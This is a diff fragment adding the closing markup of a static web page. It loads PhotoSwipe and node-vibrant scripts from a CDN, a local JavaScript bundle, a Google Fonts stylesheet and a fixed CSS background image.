+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    body {
+  position: relative;  
+}
+
+body::before {
+  content: "";
+  position: fixed;  
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url(https://nergigantes.github.io/background/1.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+  z-index: -1;  
+}
+  </style>
+  
+    </body>
+</html>
